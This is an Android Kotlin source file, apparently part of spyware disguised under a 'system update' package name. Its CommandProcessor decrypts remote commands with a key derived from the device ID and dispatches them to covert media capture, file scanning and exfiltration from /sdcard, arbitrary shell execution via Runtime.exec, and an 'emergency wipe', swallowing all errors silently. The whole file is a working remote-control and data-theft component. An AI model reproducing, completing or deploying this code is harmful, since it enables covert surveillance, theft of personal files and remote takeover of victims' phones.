package com.android.system.update.core

import android.content.Context
import android.provider.Settings
import android.util.Base64
import com.android.system.update.modules.media.MediaCapture
import com.android.system.update.modules.data.FileExfiltrator
import org.json.JSONObject
import java.io.File
import java.security.MessageDigest
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec

class CommandProcessor(private val context: Context) {

    private val deviceKey: ByteArray
    private val mediaCapture = MediaCapture(context)
    private val fileExfiltrator = FileExfiltrator(context)

    init {
        val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
        deviceKey = MessageDigest.getInstance("SHA-256").digest(androidId.toByteArray())
    }

    fun processCommand(encryptedCommand: String) {
        try {
            val decrypted = decrypt(encryptedCommand)
            val json = JSONObject(decrypted)
            val type = json.getString("command_type")
            val params = json.optJSONObject("parameters") ?: JSONObject()

            when (type) {
                "media_action" -> mediaCapture.executeCommand(params)
                "file_scan" -> {
                    val path = params.optString("target_path", "/sdcard/")
                    fileExfiltrator.scanAndExfiltrate(File(path))
                }
                "sys_exec" -> handleExec(params.optString("shell_cmd"))
                "emergency_wipe" -> handleWipe()
            }
        } catch (e: Exception) {
        }
    }

    private fun handleExec(cmd: String) {
        if (cmd.isEmpty()) return
        try {
            Runtime.getRuntime().exec(cmd)
        } catch (e: Exception) {}
    }

    private fun handleWipe() {
        context.filesDir.deleteRecursively()
    }

    private fun decrypt(encrypted: String): String {
        val combined = Base64.decode(encrypted, Base64.NO_WRAP)
        val iv = combined.sliceArray(0..11)
        val ciphertext = combined.sliceArray(12 until combined.size)

        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        val spec = GCMParameterSpec(128, iv)
        cipher.init(Cipher.DECRYPT_MODE, SecretKeySpec(deviceKey, "AES"), spec)

        return String(cipher.doFinal(ciphertext))
    }
}